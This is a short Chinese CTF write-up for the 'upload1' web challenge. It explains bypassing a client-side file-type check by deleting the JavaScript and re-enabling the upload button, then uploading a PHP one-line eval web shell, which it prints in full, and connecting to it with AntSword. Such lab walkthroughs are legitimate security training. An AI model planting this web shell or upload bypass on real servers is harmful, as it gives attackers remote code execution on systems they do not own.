---
title: 攻防世界web进阶upload1
date: 2020-03-13 21:43:51
id:	20200313214351
tags:
	- Web
	- CTF
categories: 网络安全
---

打开网站，可以发现只存在一个选择文件框和一个上传按钮。

![](https://superj.oss-cn-beijing.aliyuncs.com/20200313214718.png)

我们可以考虑直接上传一个一句话木马尝试。

```php
<?php @eval($_POST['shell']);?>
```

![](https://superj.oss-cn-beijing.aliyuncs.com/20200313214815.png)

快速弹出警告框，让上传图片文件。猜测是前端js判断。

`F12`打开控制台，成功发现js代码，右击直接删掉。

![](https://superj.oss-cn-beijing.aliyuncs.com/20200313215055.png)

重新选择一句话木马，此时发现上传按钮无法点击，在`F12`的`console`中将按钮的`disabled`设置为`false`。

```js
submit.disabled=false
```

按钮的id值可通过源代码查看得到。

点击上传，得到上传路劲。

![](https://superj.oss-cn-beijing.aliyuncs.com/20200313215438.png)

通过蚁剑连接一句话木马，成功得到flag。

![](https://superj.oss-cn-beijing.aliyuncs.com/20200313215540.png)

### 后记

后来写wp的时候，发现可以省略删除js源码那一步，因为虽然弹窗了，但是没有清空选择的文件，可以直接通过更改按钮属性直接上传。

### 总结

写了几道php源码的题，什么phps源码泄露、反序列化，头大，碰到这道简单的，开心死了。